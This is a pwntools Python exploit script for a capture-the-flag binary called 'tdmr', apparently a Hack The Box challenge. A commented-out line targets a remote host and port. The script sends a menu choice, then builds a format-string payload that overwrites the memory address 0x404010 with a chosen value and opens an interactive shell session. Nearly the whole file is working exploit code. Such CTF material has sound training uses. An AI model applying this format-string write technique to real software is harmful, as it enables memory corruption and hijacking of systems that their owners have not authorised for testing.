from pwn import *

context.clear(arch='amd64', terminal=['tmux', 'splitw', '-fh'])

gdbscript = '''b *main+324
b *main+381
c
'''

p = process('./tdmr')
#p = gdb.debug('./tdmr', gdbscript=gdbscript)
#p = remote('83.136.249.46', 58347)

memory = 0x404010
value = 322419389

p.sendline(b'3')
print(p.recvuntil(b'>>').decode())

offset = 8

payload = fmtstr_payload(offset, {memory: value})
print(payload)

p.sendline(payload)

#p.recvuntil(b'HTB{')
#print(p.recvall())

p.interactive()
